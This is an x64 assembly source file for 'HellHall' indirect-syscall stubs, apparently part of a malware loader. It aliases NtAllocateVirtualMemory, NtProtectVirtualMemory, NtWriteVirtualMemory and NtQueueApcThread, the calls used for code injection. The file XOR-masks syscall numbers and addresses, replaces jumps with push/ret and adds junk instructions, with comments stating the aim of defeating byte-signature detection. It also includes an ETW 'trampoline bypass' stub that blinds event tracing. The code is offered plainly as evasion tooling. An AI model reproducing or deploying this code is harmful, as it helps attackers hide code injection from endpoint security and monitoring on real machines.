bits 64
default rel

; XOR keys — values in .data are stored masked so plaintext never sits on disk
%define KEY_SSN   0xD3C97B2F
%define KEY_ADDR  0xD3C97B2FD3C97B2F

; ---------------------------------------------------------------------------
; .data — stored as (realValue ^ key); decoded at dispatch time
; ---------------------------------------------------------------------------
section .data
    dwSSN  dd 0
    qAddr  dq 0

; ---------------------------------------------------------------------------
; .text
; ---------------------------------------------------------------------------
section .text

; ---------------------------------------------------------------------------
; SetConfig(WORD wSSN [ecx], PVOID pSyscallInst [rdx])
; XOR-masks both values before storing so .data never holds plaintext.
; ---------------------------------------------------------------------------
global SetConfig
SetConfig:
    push  rax
    xor   ecx,  KEY_SSN             ; mask SSN before store
    mov   dword [rel dwSSN], ecx
    mov   rax,  KEY_ADDR            ; mask address before store
    xor   rdx,  rax
    mov   qword [rel qAddr], rdx
    pop   rax
    ret

; ---------------------------------------------------------------------------
; HellHall dispatch — four typed aliases, one body
;
; Obfuscation applied:
;   • address decoded into r11 BEFORE eax is set (avoids rax clobber)
;   • push r11 / ret replaces jmp [qAddr] — no indirect-jump byte pattern
;   • junk ops interspersed to break byte-signature matching
; ---------------------------------------------------------------------------
global HellHall_NtAVM
global HellHall_NtPVM
global HellHall_NtWVM
global HellHall_NtQAT

HellHall_NtAVM:
HellHall_NtPVM:
HellHall_NtWVM:
HellHall_NtQAT:
    mov   r10, rcx                  ; NT ABI: first arg → r10
    and   r8d, r8d                  ; [junk] dead flag test on arg3
    mov   r11, qword [rel qAddr]    ; load masked address
    mov   rax, KEY_ADDR             ; decode key (rax free — eax not set yet)
    xor   r11, rax                  ; r11 = real syscall instruction address
    or    r9d, r9d                  ; [junk] dead flag test on arg4
    mov   eax, dword [rel dwSSN]    ; load masked SSN
    xor   eax, KEY_SSN              ; eax = real SSN
    push  r11                       ; push target onto stack …
    ret                             ; … ret pops it → no jmp pattern

; ---------------------------------------------------------------------------
; RetStub — ETW trampoline bypass: returns STATUS_SUCCESS (RAX = 0)
; ---------------------------------------------------------------------------
global RetStub
RetStub:
    neg   rax                       ; [junk] overwritten by xor below
    xor   eax, eax
    ret
